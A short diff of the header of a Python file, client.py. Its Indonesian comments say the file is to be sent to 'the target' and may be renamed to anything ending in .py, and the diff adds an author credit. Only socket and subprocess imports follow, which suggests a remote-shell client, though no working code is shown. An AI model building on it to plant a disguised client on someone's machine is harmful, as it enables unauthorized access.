@@ -1,5 +1,6 @@
 #client.py adalah sebuah source code python yang nanti nya di kirimkan ke target
 #tidak harus dengan namanya client.py,terserah mau di ganti nama apa aja yang penting berformat (.py)
+#Author by code Profesor Acc
 import socket
 import subprocess
 
